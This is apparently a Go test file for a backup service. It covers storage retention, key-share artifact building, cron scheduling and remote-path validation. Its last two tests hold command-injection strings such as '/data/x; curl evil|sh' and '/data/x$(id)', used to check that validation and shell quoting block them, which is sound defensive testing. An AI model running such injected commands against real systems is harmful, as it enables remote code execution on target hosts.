package backup

import (
	"archive/tar"
	"compress/gzip"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/glebarez/sqlite"
	"gorm.io/gorm"

	"github.com/custos-machina/backend/internal/config"
	"github.com/custos-machina/backend/internal/pkg/crypto"
)

func testSvc(t *testing.T) (*Service, *gorm.DB, string) {
	t.Helper()
	db, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	if err != nil {
		t.Fatal(err)
	}
	if err := db.AutoMigrate(&Job{}, &Run{}); err != nil {
		t.Fatal(err)
	}
	// 临时数据目录模拟平台 /data（DSN 指向其下 custos.db）
	dir := t.TempDir()
	cfg := &config.Config{}
	cfg.Database.Driver = "sqlite"
	cfg.Database.DSN = filepath.Join(dir, "custos.db")
	cfg.Secrets.MasterKey = strings.Repeat("ab", 32)
	cipher, err := crypto.NewCipher(cfg.Secrets.MasterKey)
	if err != nil {
		t.Fatal(err)
	}
	return NewService(db, cipher, cfg, nil), db, dir
}

func TestSanitizePrefix(t *testing.T) {
	if got := sanitizePrefix("M1 验收-Backup"); !strings.HasPrefix(got, "m1") || !strings.HasSuffix(got, "backup") {
		t.Errorf("sanitizePrefix 结果异常: %q", got)
	}
	if got := sanitizePrefix("///"); got != "backup" {
		t.Errorf("全非法字符应回退 backup: %q", got)
	}
}

func TestLocalStoragePutListRetention(t *testing.T) {
	st := &localStorage{dir: t.TempDir()}
	ctx := context.Background()
	for i := 0; i < 4; i++ {
		name := artifactName("job-")
		// 手工控制时间序：重命名保证字典序
		_ = name
	}
	// 直接按序写入 4 个产物
	names := []string{"job-20260101T000001Z.tar.gz", "job-20260102T000001Z.tar.gz",
		"job-20260103T000001Z.tar.gz", "job-20260104T000001Z.tar.gz"}
	for _, n := range names {
		if err := st.Put(ctx, n, 0, strings.NewReader("x")); err != nil {
			t.Fatal(err)
		}
	}
	got, err := st.List(ctx, "job-")
	if err != nil || len(got) != 4 {
		t.Fatalf("List 应有 4 个: %v %v", got, err)
	}
	removed, err := enforceRetention(ctx, st, "job-", 3)
	if err != nil || removed != 1 {
		t.Fatalf("保留 3 应删 1 个最旧: removed=%d err=%v", removed, err)
	}
	got, _ = st.List(ctx, "job-")
	if len(got) != 3 || got[0] != "job-20260102T000001Z.tar.gz" {
		t.Fatalf("最旧应被删: %v", got)
	}
}

func TestPlatformSelfArtifact(t *testing.T) {
	svc, _, dir := testSvc(t)
	// 造数据
	if err := os.WriteFile(filepath.Join(dir, "custos.db"), []byte("FAKE-DB"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(dir, "logs"), 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "logs", "x.log"), []byte("log"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(dir, "backups"), 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "backups", "old.tar.gz"), []byte("bk"), 0o600); err != nil {
		t.Fatal(err)
	}

	j := Job{Name: "self", Type: TypePlatformSelf, Storage: StorageLocal,
		LocalDir: filepath.Join(dir, "out"), RetentionCount: 3}
	enc, err := svc.cipher.Encrypt("恢复口令-123")
	if err != nil {
		t.Fatal(err)
	}
	j.PassphraseEnc = enc
	if err := os.MkdirAll(filepath.Join(dir, "out"), 0o750); err != nil {
		t.Fatal(err)
	}

	r := &runner{job: j, cipher: svc.cipher, masterKey: svc.cfg.Secrets.MasterKey, dataDir: svc.dataDir()}
	out := filepath.Join(dir, "out", "self-test.tar.gz")
	f, err := os.Create(out)
	if err != nil {
		t.Fatal(err)
	}
	mf, err := r.buildArtifact(context.Background(), f)
	_ = f.Close()
	if err != nil {
		t.Fatalf("构建产物失败: %v", err)
	}

	// 校验产物内容
	rf, _ := os.Open(out)
	defer func() { _ = rf.Close() }()
	gz, err := gzip.NewReader(rf)
	if err != nil {
		t.Fatal(err)
	}
	tr := tar.NewReader(gz)
	var names []string
	var keyShare []byte
	for {
		hdr, e := tr.Next()
		if e == io.EOF {
			break
		}
		if e != nil {
			t.Fatal(e)
		}
		names = append(names, hdr.Name)
		if hdr.Name == "keyshare.enc" {
			keyShare, _ = io.ReadAll(tr)
		}
	}
	joined := strings.Join(names, ",")
	if !strings.Contains(joined, "data/custos.db") {
		t.Errorf("产物应含 DB 文件: %s", joined)
	}
	if strings.Contains(joined, "logs/") || strings.Contains(joined, "backups/") {
		t.Errorf("产物应排除 logs/ 与 backups/: %s", joined)
	}
	if !strings.Contains(joined, "manifest.json") || !strings.Contains(joined, "keyshare.enc") {
		t.Errorf("产物缺 manifest 或 keyshare: %s", joined)
	}
	if mf.Entries == 0 || !mf.HasDB {
		t.Errorf("manifest 统计异常: %+v", mf)
	}

	// 密钥份额可用口令解开且值为主密钥
	plain, err := crypto.PassphraseDecrypt(keyShare, "恢复口令-123")
	if err != nil {
		t.Fatalf("keyshare 解密失败: %v", err)
	}
	var share struct {
		MasterKey string `json:"masterKey"`
	}
	if err := json.Unmarshal(plain, &share); err != nil {
		t.Fatal(err)
	}
	if share.MasterKey != svc.cfg.Secrets.MasterKey {
		t.Errorf("keyshare 主密钥不符")
	}
}

func TestScheduleNextAndScan(t *testing.T) {
	svc, db, _ := testSvc(t)
	ctx := context.Background()
	// 不合法表达式创建应拒绝
	if _, err := svc.CreateJob(ctx, SaveJobInput{Name: "x", Type: TypeRemoteDir, ServerID: 1,
		RemotePath: "/tmp", Storage: StorageLocal, LocalDir: t.TempDir(),
		Schedule: "not-cron", RetentionCount: 3}); err == nil {
		t.Error("非法表达式应拒绝")
	}
	// 合法任务：next_run_at 立即到点 → scanDue 触发执行（remote_dir 会失败——无 SSH，走失败留痕路径）
	j, err := svc.CreateJob(ctx, SaveJobInput{Name: "r", Type: TypeRemoteDir, ServerID: 1,
		RemotePath: "/tmp", Storage: StorageLocal, LocalDir: t.TempDir(),
		Schedule: "* * * * *", RetentionCount: 3})
	if err != nil {
		t.Fatal(err)
	}
	if j.NextRunAt == nil {
		t.Fatal("应预计算 next_run_at")
	}
	db.Model(&Job{}).Where("id = ?", j.ID).Update("next_run_at", time.Now().Add(-time.Minute))
	if err := svc.scanDue(ctx); err != nil {
		t.Fatal(err)
	}
	time.Sleep(200 * time.Millisecond)
	var runs []Run
	db.Where("job_id = ?", j.ID).Find(&runs)
	if len(runs) == 0 {
		t.Fatal("到点任务应产生运行记录")
	}
	if runs[0].Status != RunFailed {
		t.Errorf("无 SSH 环境下应失败留痕: %+v", runs[0])
	}
	// next_run_at 已推进
	var after Job
	db.First(&after, j.ID)
	if after.NextRunAt == nil || !after.NextRunAt.After(time.Now()) {
		t.Error("next_run_at 应推进到未来")
	}
}

// 远端路径白名单（v0.12.0 审计严重项 4）：RemotePath 拆分后拼进目标机 shell，
// '/data/x; curl evil|sh; #' 这类输入必须在校验层被拒。
func TestValidateJobRemotePathWhitelist(t *testing.T) {
	svc := &Service{cfg: &config.Config{Database: config.Database{Driver: "sqlite"}}}
	ok := []string{"/data/app", "/var/log/nginx", "/srv/backup.2024", "/data/a_b-c"}
	for _, p := range ok {
		in := SaveJobInput{Name: "n", Type: TypeRemoteDir, ServerID: 1, RemotePath: p,
			Storage: StorageLocal, RetentionCount: 3}
		if err := svc.validateJob(in); err != nil {
			t.Errorf("合法路径被拒 %q: %v", p, err)
		}
	}
	bad := []string{
		"/data/x; curl evil|sh", // 命令注入
		"/data/x$(id)",          // 命令替换
		"/data/a b",             // 空白
		"/data/目录",              // 中文
		"data/relative",         // 相对路径
		"~/home",                // 非 / 开头
		"/data/x`id`",           // 反引号
		"/-lead",                // 首字符非字母数字
	}
	for _, p := range bad {
		in := SaveJobInput{Name: "n", Type: TypeRemoteDir, ServerID: 1, RemotePath: p,
			Storage: StorageLocal, RetentionCount: 3}
		if err := svc.validateJob(in); err == nil {
			t.Errorf("非法路径未被拒: %q", p)
		}
	}
}

// 拼装层引号化：即使带元字符的路径穿透到 runner，tar 命令里也必须被引号包裹。
func TestWriteRemoteDirQuotesShellMetachars(t *testing.T) {
	var gotCmd string
	r := &runner{
		job: Job{ServerID: 1, RemotePath: "/data/x; curl evil|sh", Type: TypeRemoteDir},
		sshRun: func(_ context.Context, _ uint, cmd string, _ time.Duration) (string, error) {
			gotCmd = cmd
			return "", fmt.Errorf("stop here")
		},
		sftpPull: func(_ context.Context, _ uint, _ string, _ io.Writer) (int64, error) { return 0, nil },
	}
	_ = r.writeRemoteDir(context.Background(), tar.NewWriter(io.Discard), &manifest{})
	if !strings.Contains(gotCmd, "-C '/data' 'x; curl evil|sh'") {
		t.Errorf("parent/base 应被 shellQuote 包裹: %q", gotCmd)
	}
}
